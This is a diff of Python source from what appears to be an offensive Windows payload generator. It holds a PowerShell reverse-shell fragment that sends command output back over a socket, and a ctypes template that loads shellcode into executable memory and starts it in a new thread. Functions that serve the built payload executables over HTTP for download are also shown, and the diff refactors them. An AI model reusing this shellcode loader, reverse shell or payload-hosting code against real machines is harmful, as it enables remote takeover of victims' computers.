@@ -18,8 +18,11 @@ import readline
 import time
 import psexec
 import urllib2
+from collections import OrderedDict
+import string
 
 t = blessings.Terminal()
+
 
 
 class SHELLCODE(object):
@@ -163,9 +166,9 @@ class SHELLCODE(object):
         "$backres = $backres + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
 
-    injectwindows = """#/usr/bin/python
+    injectwindows = """
+#/usr/bin/python
 import ctypes
-
 shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
 buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
@@ -174,7 +177,17 @@ ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 """
 
+
 class FUNCTIONS(object):
+
+    def CheckInternet(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(('8.8.8.8', 0))
+            IP = s.getsockname()[0]
+            return IP
+        except:
+            return None
 
     def winpayloads_help(self):
         print_payloads =(
@@ -314,19 +327,19 @@ class FUNCTIONS(object):
         except:
             print t.bold_red + '\n[*] WebServer Shutdown' + t.normal
 
-    def DoServe(self, want_to_payloadinexe, want_to_upload, IP, payloadinexe_payloadnameshort, payloadname, payloaddir):
-        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
-            a = multiprocessing.Process(
-                target=self.ServePayload, args=(os.getcwd() + '/compiled',))
-            a.daemon = True
-            a.start()
-        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
-            a = multiprocessing.Process(
-                target=self.ServePayload, args=(payloaddir,))
-            a.daemon = True
-            a.start()
+    def DoServeShellter(self, IP, payloadname):
+        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
+        a = multiprocessing.Process(
+            target=self.ServePayload, args=(os.getcwd() + '/compiled',))
+        a.daemon = True
+        a.start()
+
+    def DoServe(self, IP, payloadname, payloaddir):
+        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s.exe" % (IP, payloadname) + t.normal
+        a = multiprocessing.Process(
+            target=self.ServePayload, args=(payloaddir,))
+        a.daemon = True
+        a.start()
 
 
 class Spinner(object):
